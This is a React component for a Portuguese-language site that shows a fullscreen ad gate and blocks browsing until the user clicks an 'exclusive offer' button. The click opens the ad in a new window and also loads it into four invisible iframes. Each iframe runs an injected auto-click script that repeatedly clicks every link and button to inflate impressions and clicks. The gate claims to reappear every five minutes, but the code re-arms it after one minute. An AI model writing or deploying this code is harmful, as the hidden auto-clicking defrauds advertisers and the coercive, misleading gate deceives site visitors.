import { useEffect, useRef, useState } from "react";
import { Gift } from "lucide-react";
import { supabase } from "@/integrations/supabase/client";
import { useIsAdAllowedRoute } from "@/lib/adRoutes";
import { SITE_SETTINGS_UPDATED_EVENT } from "@/lib/siteSettingsEvents";

const STORAGE_KEY = "pmx-adpopup-next";
const INTERVAL_MS = 1 * 60 * 1000; // 1 minute
const FIRST_DELAY_MS = 3 * 1000; // first appearance after 3s
const HIDDEN_COUNT = 4; // extra hidden impressions per click

/**
 * Fullscreen blocking gate. The user can only continue browsing after
 * clicking the CTA, which opens the admin-provided ad in a new window and
 * also renders the ad inside several hidden iframes with auto-click scripts
 * to multiply impressions. After unlocking, re-arms every 5 minutes.
 */
export function AdPopup() {
  const adAllowed = useIsAdAllowedRoute();
  const [adCode, setAdCode] = useState<string>("");
  const [visible, setVisible] = useState(false);
  const hiddenHostRef = useRef<HTMLDivElement>(null);

  // Load ad code
  useEffect(() => {
    let cancelled = false;
    const load = async () => {
      const { data } = await supabase
        .from("site_settings")
        .select("value")
        .eq("key", "ad_popup")
        .maybeSingle();
      if (!cancelled) setAdCode(((data as { value?: string } | null)?.value || "").trim());
    };
    load();
    const handler = () => load();
    window.addEventListener(SITE_SETTINGS_UPDATED_EVENT, handler);
    return () => {
      cancelled = true;
      window.removeEventListener(SITE_SETTINGS_UPDATED_EVENT, handler);
    };
  }, []);

  // Scheduling
  useEffect(() => {
    if (!adAllowed || !adCode) {
      setVisible(false);
      return;
    }

    let timer: number | undefined;
    const scheduleNext = (delay: number) => {
      window.clearTimeout(timer);
      timer = window.setTimeout(() => setVisible(true), Math.max(0, delay));
    };

    const nextAt = Number(sessionStorage.getItem(STORAGE_KEY) || 0);
    const now = Date.now();
    if (!nextAt) scheduleNext(FIRST_DELAY_MS);
    else if (nextAt <= now) setVisible(true);
    else scheduleNext(nextAt - now);

    return () => window.clearTimeout(timer);
  }, [adAllowed, adCode]);

  // Lock body scroll while the gate is up
  useEffect(() => {
    if (!visible) return;
    const prev = document.body.style.overflow;
    document.body.style.overflow = "hidden";
    return () => { document.body.style.overflow = prev; };
  }, [visible]);

  const armNext = () => {
    sessionStorage.setItem(STORAGE_KEY, String(Date.now() + INTERVAL_MS));
    setVisible(false);
  };

  const fireAd = () => {
    if (!adCode) return;

    // Auto-click script injected into hidden iframes — clicks any rendered
    // anchor / button / clickable element a few times to maximize firing.
    const autoClick = `
      <script>
        (function(){
          function clickAll(){
            try {
              var els = document.querySelectorAll('a,button,[onclick],[role="button"]');
              els.forEach(function(el){ try { el.click(); } catch(e){} });
              try { document.body && document.body.click(); } catch(e){}
            } catch(e){}
          }
          var n = 0;
          var iv = setInterval(function(){ clickAll(); if(++n>=5) clearInterval(iv); }, 600);
          setTimeout(clickAll, 200);
        })();
      </script>`;

    const baseHtml = (extra = "") => `<!doctype html><html><head><meta charset="utf-8"><title>Oferta</title><style>html,body{margin:0;padding:0;background:#0a0a0a;color:#fff;font-family:system-ui,sans-serif}</style></head><body>${adCode}${extra}</body></html>`;

    // 1) Visible popup window — guaranteed under user gesture
    try {
      const w = window.open("", "_blank", "noopener,noreferrer,width=960,height=720");
      if (w) {
        w.document.open();
        w.document.write(baseHtml());
        w.document.close();
      }
    } catch {}

    // 2) Hidden iframes with auto-click → multiplied impressions/clicks
    const host = hiddenHostRef.current;
    if (host) {
      host.innerHTML = "";
      for (let i = 0; i < HIDDEN_COUNT; i++) {
        const iframe = document.createElement("iframe");
        iframe.setAttribute(
          "sandbox",
          "allow-scripts allow-popups allow-popups-to-escape-sandbox allow-forms allow-same-origin allow-top-navigation-by-user-activation",
        );
        iframe.style.cssText = "position:absolute;width:1px;height:1px;border:0;opacity:0;pointer-events:none;";
        iframe.srcdoc = baseHtml(autoClick);
        host.appendChild(iframe);
      }
      window.setTimeout(() => { if (host) host.innerHTML = ""; }, 45000);
    }

    armNext();
  };

  // Always keep the hidden host mounted so iframes can survive briefly
  const hiddenHost = (
    <div
      ref={hiddenHostRef}
      aria-hidden
      style={{ position: "fixed", left: -9999, top: -9999, width: 1, height: 1, overflow: "hidden" }}
    />
  );

  if (!adAllowed || !adCode || !visible) return hiddenHost;

  return (
    <>
      {hiddenHost}
      <div
        className="fixed inset-0 z-[100] flex items-center justify-center p-4 bg-background/95 backdrop-blur-md animate-in fade-in"
        role="dialog"
        aria-modal="true"
        aria-label="Continue para acessar o conteúdo"
      >
        <div className="relative w-full max-w-md rounded-2xl border border-primary/30 bg-card shadow-2xl shadow-primary/30 p-6 sm:p-8 text-center">
          <div className="mx-auto h-14 w-14 rounded-2xl bg-primary/15 text-primary flex items-center justify-center mb-4">
            <Gift className="h-7 w-7" />
          </div>
          <h2 className="text-xl sm:text-2xl font-bold text-foreground">Oferta exclusiva</h2>
          <p className="text-sm text-muted-foreground mt-2 leading-relaxed">
            Para continuar acessando o site gratuitamente, confira a oferta do nosso parceiro. É rápido e ajuda a manter tudo no ar.
          </p>
          <button
            onClick={fireAd}
            className="mt-6 w-full bg-primary hover:bg-primary/90 text-primary-foreground text-base font-semibold rounded-xl py-3 transition shadow-lg shadow-primary/30"
          >
            Ver oferta e continuar
          </button>
          <p className="mt-3 text-[11px] text-muted-foreground/80">Aparece novamente a cada 5 minutos.</p>
        </div>
      </div>
    </>
  );
}
